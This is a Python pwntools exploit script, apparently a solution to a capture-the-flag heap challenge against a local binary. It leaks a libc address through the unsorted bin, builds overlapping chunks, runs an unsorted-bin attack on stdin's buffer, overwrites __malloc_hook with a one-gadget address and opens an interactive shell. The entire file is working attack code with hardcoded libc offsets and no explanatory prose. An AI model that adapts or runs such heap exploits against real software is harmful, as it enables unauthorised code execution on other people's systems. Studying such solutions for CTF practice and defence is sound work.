#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './pwn'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('>>')
    io.sendline(str(idx))

def add(l, i, c):
    menu(1)
    io.recvuntil(":")
    io.sendline(str(l))
    io.recvuntil(":")
    io.sendline(str(i))
    io.recvuntil(":")
    io.send(c)

def remove(i):
    menu(2)
    io.recvuntil(":")
    io.sendline(str(i))

def show(i):
    menu(3)
    io.recvuntil(":")
    io.sendline(str(i))


add(0x50, 0, 'a' * 8)
add(0x50, 1, 'a' * 8)
add(0x50, 2, 'a' * 8)
add(0x50, 3, 'b' * 8)
add(0x50, 4, 'c' * 8)
add(0x50, 5, 'd' * 0x10)
remove(4)
remove(3)
remove(2)
remove(1)
remove(0)
menu('1' * 0x500)
add(0x30, 0, '1')
show(0)
io.recvuntil("flowers : ")

libc_addr = myu64(io.recvn(6)) - 0x3c4d31
log.info("\033[33m" + hex(libc_addr) + "\033[0m")
libc.address = libc_addr

# clean up
remove(0)
menu('1' * 0x500)

# now we have to make an overlapping chunk
add(0x58, 0, 'a' * 8)
add(0x58, 1, 'b' * 0x58)
add(0x38, 2, p64(libc_addr + 0x3c4b78) * 6 + p64(0x40))
add(0x50, 3, 'c')
add(0x50, 4, 'd')
remove(2)
menu('1' * 0x500)
# 2 5 left
remove(5)
menu('1' * 0x500)

# lets try ub attack
add(0x40, 2, '\0' * 0x40)
remove(2)
add(0x50, 2, '\0' * 0x50)
remove(2)
add(0x50, 5, '\0' * 0x30)
remove(5)
add(0x10, 5, '\0' * 0x10)
menu('0' * 0x500)

add(0x10, 2, 'a' * 0x10)
remove(2)
add(0x20, 2, 'x' * 0x10 + p64(0) + p64(0x50))
add(0x50, 5, 'k' * 0x30 + p64(0) + p64(0x50))
remove(5)
remove(2)
menu('1' * 0x500)
remove(3)
add(0x50, 2, 'aaaa')
buf_end = libc_addr + 0x3c4920
add(0x40, 5, 'y' * 0x10 + p64(0) +  p64(0x51) + p64(libc_addr + 0x3c4b78) + p64(buf_end - 0x10))
add(0x40, 3, 'aaaa')

# overwrite malloc_hook
base = 0x00001555553289c0
buf = '\0' * 5
buf += p64(libc_addr + 0x3c670a)
buf += p64(0xffffffffffffffff) + p64(0)
buf += p64(libc_addr + 0x00001555553289c0 - base)
buf += p64(0) * 3
buf += p64(0x00000000ffffffff) + p64(0)
buf += p64(0) + p64(libc_addr + 0x00001555553276e0 - base)
buf += (p64(0) + p64(0)) * 21
buf += p64(libc_addr + 0xf1147)
menu(buf)







io.interactive()
